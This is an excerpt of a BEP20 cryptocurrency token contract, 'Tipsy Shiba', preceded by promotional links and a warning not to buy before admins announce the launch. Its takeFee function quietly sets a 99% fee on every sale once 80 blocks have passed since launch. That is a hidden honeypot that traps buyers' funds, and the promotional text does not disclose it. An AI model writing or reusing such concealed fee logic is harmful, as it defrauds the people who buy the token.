...
🕊: https://twitter.com/TipsyShiba

🌐: https://www.tipsyshiba.space/

🎵: https://www.tiktok.com/@tipsyshiba


DO NOT BUY AT LAUNCH UNTIL ADMINS CONFIRM WHEN TO LAUNCH, WE HAVE ANTIBOT MEASURES

Telegram :  https://t.me/TIPSYSHIBA
...
contract TipsyShiba is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "Tipsy Shiba";
    string constant _symbol = "TIPSYSHIBA ";
    ...
    function takeFee(address sender, uint256 amount, bool isSell) internal returns (uint256) {
        ...
        } else if(isSell && (launchedAt + 80 < block.number)){
            feeAmount = amount.div(100).mul(99);
        }
